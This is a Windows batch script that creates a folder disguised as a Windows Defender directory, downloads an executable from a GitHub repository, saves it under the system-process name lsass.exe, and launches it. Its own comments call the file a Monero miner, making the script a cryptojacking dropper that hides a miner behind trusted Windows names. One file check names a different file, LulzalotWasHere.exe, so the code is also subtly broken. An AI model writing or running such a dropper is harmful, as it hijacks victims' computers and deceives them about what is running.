@echo off
setlocal enabledelayedexpansion

:: Set the download location
set "folderPath=%USERPROFILE%\Program Files (x86)\Windows Defender"
mkdir "%folderPath%"

:: Debugging: Check folder creation status
if exist "%folderPath%" (
    echo Folder created successfully: "%folderPath%"
) else (
    echo Failed to create folder: "%folderPath%"
    exit /b 1
)

:: Debugging: Attempt to download the Monero miner executable
echo Downloading miner executable...
curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> "%folderPath%\download_error.log"

:: Check if curl failed
if %errorlevel% neq 0 (
    echo Curl failed with error code %errorlevel%.
    echo Check the error log for details: "%folderPath%\download_error.log"
    exit /b 1
) else (
    echo File downloaded successfully.
)

:: Debugging: Verify the file exists and check its size
if exist "%folderPath%\LulzalotWasHere.exe" (
    for %%F in ("%folderPath%\lsass.exe") do (
        set filesize=%%~zF
    )
    
    if "%filesize%"=="0" (
        echo Download failed or file is empty. Size: 0 bytes. Exiting...
        exit /b 1
    ) else (
        echo File downloaded successfully. Size: %filesize% bytes.
    )
) else (
    echo File download failed. File not found. Exiting...
    exit /b 1
)

:: Debugging: Confirm that the miner can be run
echo Running the Monero miner...
start "" "%folderPath%\lsass.exe"

:: End of script
exit
